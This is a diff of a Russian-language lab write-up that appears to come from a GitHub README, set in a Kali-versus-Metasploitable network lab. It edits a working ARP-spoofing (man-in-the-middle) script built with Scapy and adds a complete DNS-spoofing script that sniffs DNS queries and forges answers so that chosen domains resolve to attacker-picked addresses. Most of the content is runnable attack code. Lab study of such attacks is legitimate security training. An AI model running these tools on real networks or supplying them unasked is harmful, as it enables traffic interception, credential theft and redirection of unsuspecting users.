@@ -100,37 +100,32 @@ def enable_ip_forward():
     print("[*] IP forwarding enabled")
 
 def get_mac(ip, iface="eth0"):
-    """Получить MAC через ARP-запрос"""
     ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=iface)
     if ans:
         return ans[0][1].hwsrc
     return None
 
 def arp_spoof(target_ip, spoof_ip, target_mac, iface="eth0"):
-    """Отправка поддельного ARP-ответа"""
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     send(packet, verbose=False, iface=iface)
 
 def arp_restore(target_ip, source_ip, target_mac, source_mac, iface="eth0"):
-    """Восстановление ARP-таблицы"""
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
     send(packet, count=5, verbose=False, iface=iface)
 
 def get_my_mac(iface="eth0"):
-    """Получить свой MAC"""
     return get_if_hwaddr(iface)
 
 def main():
     # === НАСТРОЙКИ ДЛЯ ВАШЕЙ СЕТИ ===
-    IFACE = "eth0"                      # Ваш интерфейс в LAN
-    TARGET = "192.168.10.50"            # Metasploitable (жертва)
-    GATEWAY = "192.168.10.1"            # Роутер (реальный шлюз)
+    IFACE = "eth0"
+    TARGET = "192.168.10.50"            # Metasploitable
+    GATEWAY = "192.168.10.1"            # Роутер
     
     print(f"[*] Интерфейс: {IFACE}")
     print(f"[*] Жертва: {TARGET}")
     print(f"[*] Шлюз: {GATEWAY}")
     
-    # Получаем MAC-адреса
     target_mac = get_mac(TARGET, IFACE)
     gateway_mac = get_mac(GATEWAY, IFACE)
     
@@ -180,3 +175,58 @@ if __name__ == "__main__":
 <img width="573" height="85" alt="изображение" src="https://github.com/user-attachments/assets/6b676420-00a7-4b35-a13e-19d53d6b8658" />
 
 - Теперь `Metasploitable` теперь думает, что `Kali` это еще один шлюз
+
+## DNS Spoofing
+
+Скрипт для генерации `DNS Spoofing`:
+
+```py
+#!/usr/bin/env python3
+from scapy.all import *
+import argparse
+
+def process_packet(pkt, spoof_map, iface):
+    if pkt.haslayer(DNSQR):
+        qname = pkt[DNSQR].qname.decode().rstrip('.')
+        
+        if qname in spoof_map:
+            spoof_ip = spoof_map[qname]
+            print(f"[+] {qname} -> {spoof_ip}")
+            
+            dns_reply = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+                        UDP(dport=pkt[UDP].sport, sport=53) / \
+                        DNS(
+                            id=pkt[DNS].id,
+                            qr=1,
+                            aa=1,
+                            qd=pkt[DNS].qd,
+                            an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoof_ip)
+                        )
+            
+            send(dns_reply, verbose=0, iface=iface)
+
+def main():
+    parser = argparse.ArgumentParser(description="DNS Spoofing")
+    parser.add_argument("-i", "--iface", required=True, help="Interface")
+    parser.add_argument("-d", "--domain", action="append", required=True, help="domain=ip")
+    
+    args = parser.parse_args()
+    
+    spoof_map = {}
+    for item in args.domain:
+        domain, ip = item.split("=")
+        spoof_map[domain] = ip
+    
+    print(f"[*] DNS spoofing on {args.iface}")
+    for d, ip in spoof_map.items():
+        print(f"    {d} -> {ip}")
+    
+    sniff(iface=args.iface, filter="udp port 53", 
+          prn=lambda pkt: process_packet(pkt, spoof_map, args.iface), store=0)
+
+if __name__ == "__main__":
+    main()
+```
+
+<img width="749" height="557" alt="изображение" src="https://github.com/user-attachments/assets/0fe5ad21-d21d-4cef-8d34-f65dac96c62a" />
+
